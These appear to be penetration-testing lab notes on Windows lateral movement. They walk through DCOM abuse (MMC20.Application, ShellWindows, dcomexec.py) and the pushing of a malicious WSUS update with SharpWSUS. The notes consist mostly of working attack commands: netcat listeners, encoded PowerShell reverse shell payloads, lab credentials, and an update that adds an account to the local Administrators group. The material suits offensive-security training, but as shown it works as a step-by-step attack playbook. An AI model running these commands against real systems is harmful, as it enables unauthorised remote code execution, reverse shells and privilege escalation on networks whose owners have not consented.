## DCOM 

```
$ nc -nlvp 8001

$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux 

PS C:\Tools\> $mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52")); 

View.ExecuteShellCommand( _
  ByVal Command As String, _
  ByVal Directory As String, _
  ByVal Parameters As String, _
  ByVal WindowState As String _
)

PS C:\Tools\> $mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0) 

```

In order to use it, we must complete all parameters. The first is the Command to execute, which will be powershell.exe, next we set the Directory to $null, 3rd we add PowerShell's parameters with our reverse shell payload, we will use a payload from https://www.revshells.com, and finally we set the WindowState to 0 so it will execute normally: 


```

PS C:\Tools> Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName} 

PS C:\Tools> $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","SRV02")) 

PS C:\Tools\> $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","172.20.0.52")) 

$ nc -lnvp 8080 

PS C:\Tools\> $shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==","C:\Windows\System32",$null,0) 

```

After that, we can execute any command using the ShellExecute method of the Document.Application property. We will use cmd.exe to execute our payload. We will be using a PowerShell reverse shell payload from revshells.com: 


### Linux 

```

$ python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand 

$ nc -lnvp 8001 

```


### WSUS 

```

c:\Tools> .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate" 

c:\Tools> .\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local /groupname:"FastUpdates" 

c:\Tools> .\SharpWSUS.exe inspect 

PS C:\Tools> Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl 

PS C:\Tools> copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe 

c:\Tools> .\SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local 

c:\Tools> net localgroup administrators 

c:\Tools> .\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.inlanefreight.local 

```

- SharWSUS compiled [binary](https://github.com/twisted007/Compiled_Windows_Binaries) 
